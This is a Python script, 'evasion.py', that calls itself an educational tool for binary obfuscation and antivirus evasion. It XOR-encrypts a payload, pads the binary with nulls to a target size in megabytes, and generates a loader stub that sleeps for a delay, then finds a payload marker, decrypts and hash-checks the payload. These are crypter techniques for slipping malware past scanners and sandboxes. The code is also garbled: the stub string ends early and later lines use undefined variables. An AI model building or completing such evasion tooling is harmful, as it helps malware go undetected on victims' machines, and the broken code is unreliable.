#!/usr/bin/env python3
"""
evasion.py — HiddenBytes Evasion Program
Educational tool for understanding binary obfuscation and AV evasion techniques.
"""

import argparse
import os
import sys
import time
import struct
import random
import hashlib
import logging
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s"
)
log = logging.getLogger("evasion")

def generate_key(length: int = 32) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(length))

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def pad_binary(data: bytes, target_mb: int) -> bytes:
    target_bytes = target_mb * 1024 * 1024
    current_size = len(data)

    if current_size >= target_bytes:
        log.warning("Binary already larger than target size")
        return data

    padding = b"\x00" * (target_bytes - current_size)
    return data + padding

def build_loader_stub(key: bytes, delay: int, original_hash: str) -> str:
    key_hex = key.hex()

    stub = f"""
import time, os, sys, hashlib, tempfile, subprocess

KEY = bytes.fromhex("{key_hex}")
DELAY = {delay}
EXPECTED_HASH = "{original_hash}"
"""
    return stub

def xor_decrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

time.sleep(DELAY)
marker = b"##PAYLOAD_START##"
idx = raw.find(marker)

digest = hashlib.sha256(decrypted).hexdigest()

if digest != EXPECTED_HASH:
    print("Integrity check failed")
    sys.exit(1)